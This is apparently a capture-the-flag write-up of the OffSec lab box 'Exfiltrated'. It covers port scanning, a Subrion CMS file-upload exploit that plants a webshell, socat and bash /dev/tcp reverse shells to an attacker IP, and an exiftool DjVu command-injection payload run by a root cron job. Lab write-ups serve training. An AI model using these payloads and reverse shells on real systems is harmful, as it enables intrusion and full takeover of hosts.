# CTF Writeup: Exfiltrated

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.196.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 08:49 EST
Nmap scan report for 192.168.196.163
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   27.65 ms 192.168.45.1
2   27.66 ms 192.168.45.254
3   27.62 ms 192.168.251.1
4   27.74 ms 192.168.196.163

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```

Judging from the nmap scan the page is trying to redirect us to an domain called "http://exfiltrated.offsec/", but fails. Let's map the target ip to this domain in our local dns file /etc/hosts.

```
sudo echo "192.168.196.163 http://exfiltrated.offsec" | sudo tee -a /etc/hosts
```

Enumerated an /panel endpoint via feroxbuster.

It provides us version information about an CMS and an login panel.

```
Subrion CMS v4.2.1 
```

Logged into the CMS with default credentials admin.admin

## Vulnerability Assessment

Let's search up for CVE's.

```
searchsploit Subrion                                                   
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                                      | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                     | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                                                  | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                                                      | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                                  | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                                                | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                                  | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting                     | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                                           | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                      | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                   | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                            | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                    | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                                       | php/webapps/51110.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Utilized 49876.py, ran it and gained an shell as user "www-data".

```
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: 9vjOmVULujYXMork2x04lkbjekB6UyonpgFJApRf
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: usnojsclsikmphq

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/usnojsclsikmphq.phar 

$
```

## Privilege Escalation

Enumerated users on the target system.

```
$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
coaran:x:1000:1000::/home/coaran:/bin/bash
```

The Shell seems very weak, let's get a better one.

Started up my listener on port 80.

```
nc -lvnp 80
```

```
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.164:80
```

Enumerated running cronjobs.

```
www-data@exfiltrated:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

After analyzing the script, we learned that the script runs exiftool on any .jpg in /var/www/html/subrion/uploads.

## Vulnerability Assessment
 
According to ExploitDB 49881, exiftool version 11.88 contains a command injection vulnerability when parsing DjVu metadata. This provided a privilege escalation path.

Created malicious script on my local machine.

```
cat exploit
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.164/22 0>&1\"')};")
```

I then created an .djvu file out of it and renamed it to .jpg

```
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
mv exploit.djvu exploit.jpg
```

Next Step is to upload it onto the target /var/www/html/subrion/uploads.

On local machine

```
python3 -m http.server 80
```

On target machine.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.164:8080/exploit.jpg
--2025-12-27 14:23:12--  http://192.168.45.164:8080/exploit.jpg
Connecting to 192.168.45.164:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134 [image/jpeg]
Saving to: ‘exploit.jpg’

exploit.jpg                                         0%[                                                                                       exploit.jpg                                       100%[=============================================================================================================>]     134  --.-KB/s    in 0s      

2025-12-27 14:23:12 (19.3 MB/s) - ‘exploit.jpg’ saved [134/134]
```

Gave the exploit.jpg file executable rights.

```
chmod +x exploit.jpg
```

Started up listener on port 22.

```
nc -lvnp 22
```

Gained RCE as user "root" after some time.

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.163] 37904
bash: cannot set terminal process group (3405): Inappropriate ioctl for device
bash: no job control in this shell
root@exfiltrated:~#
```

Retrived local.txt in /home/coaran directory.

```
c63bd481f74e3c4c1c979dc1abdabeb4
```

Retrieved proof.txt in /root directory.

```
108b1f1068a3077b857b99a496ab3fbc
```
